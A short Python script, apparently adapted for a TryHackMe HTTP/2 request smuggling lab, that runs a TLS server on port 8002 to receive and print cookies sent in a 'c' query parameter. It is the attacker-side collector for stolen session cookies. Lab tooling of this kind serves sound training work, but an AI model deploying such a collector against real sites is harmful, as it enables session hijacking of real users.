#modified script of tryhackme room HTTP/2 Request Smuggling for running https server (fixed error: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()   httpd.socket = ssl.wrap_socket(
# updated with help of chatgpt
# you need to run openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
# to get cert.pem and key.pem
#Tryhackme room link: https://tryhackme.com/room/http2requestsmuggling

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL and query parameters
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)

        # Assuming 'c' is the query parameter that holds the cookie information
        cookies = query_params.get('c', ['No cookie'])[0]

        # Log or process the cookie information
        print(f"Received cookie: {cookies}")

        # Respond to the client (You might want to customize this)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Received your request!")



def run(server_class=HTTPServer, handler_class=RequestHandler, port=8002):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)

    # Setup SSL context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # Use the most modern TLS protocol version available
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')  # Load your certificate and private key
    context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3  # Disable SSLv2 and SSLv3 to mitigate vulnerabilities
    context.set_ciphers('HIGH:!aNULL:!MD5:!RC4')  # Optional: configure to use high-security cipher suites

    # Wrap the server socket in the SSL context
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print(f"Server running on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
